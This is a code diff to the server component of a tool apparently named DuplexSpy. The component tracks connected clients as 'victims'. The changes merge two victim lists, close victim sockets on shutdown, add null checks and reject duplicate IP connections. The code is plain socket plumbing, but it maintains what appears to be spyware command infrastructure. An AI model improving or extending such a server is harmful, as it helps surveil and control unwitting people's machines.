@@ -15,7 +15,6 @@ namespace DuplexSpyCS
         public Socket socket;
 
         int MAX_BUFFER_LENGTH = 65536; //BUFFER MAXIMUM LENGTH
-        public List<clsVictim> l_victim = new List<clsVictim>(); //Victim LIST
 
         private List<clsVictim> m_lsVictim = new List<clsVictim>();
         public List<clsVictim> Victims { get { return m_lsVictim; } }
@@ -135,7 +134,20 @@ namespace DuplexSpyCS
 
             sql_conn.NewLogs(clsSqlConn.CSV.Server, clsSqlConn.MsgType.System, $"Stop listening port: {m_nPort}");
 
-            l_victim.Clear();
+            foreach (var victim in m_lsVictim)
+            {
+                try
+                {
+                    if (victim.socket != null && victim.socket.Connected)
+                        victim.socket.Close();
+                }
+                catch (Exception ex)
+                {
+                    clsStore.sql_conn.WriteErrorLogs(victim, ex.Message);
+                }
+            }
+
+            m_lsVictim.Clear();
 
             m_bIslistening = false;
         }
@@ -146,12 +158,15 @@ namespace DuplexSpyCS
         /// <param name="ar"></param>
         private void AcceptCallBack(IAsyncResult ar)
         {
+            if (ar?.AsyncState == null)
+                return;
+
             Socket handler = (Socket)ar.AsyncState;
             try
             {
                 Socket client = handler.EndAccept(ar);
                 handler.BeginAccept(new AsyncCallback(AcceptCallBack), handler);
-                if (l_victim.Select(x => x.socket.RemoteEndPoint.ToString().Split(':')[0]).ToArray().Contains(client.RemoteEndPoint.ToString().Split(':')[0]))
+                if (m_lsVictim.Select(x => x.socket.RemoteEndPoint.ToString().Split(':')[0]).ToArray().Contains(client.RemoteEndPoint.ToString().Split(':')[0]))
                 {
                     client.Disconnect(true);
                     return;
@@ -173,7 +188,14 @@ namespace DuplexSpyCS
         /// <param name="ar"></param>
         private void ReadCallBack(IAsyncResult ar)
         {
+            if (ar?.AsyncState == null)
+                return;
+
             clsVictim v = (clsVictim)ar.AsyncState;
+            if (v == null)
+                return;
+
+            m_lsVictim.Add(v);
             sql_conn.WriteSystemLogs($"New client is accepted: {v.socket.RemoteEndPoint.ToString()}");
             try
             {
@@ -319,7 +341,7 @@ namespace DuplexSpyCS
             finally
             {
                 fnDisconnected(v);
-                l_victim.Remove(v);
+                m_lsVictim.Remove(v);
             }
         }
     }
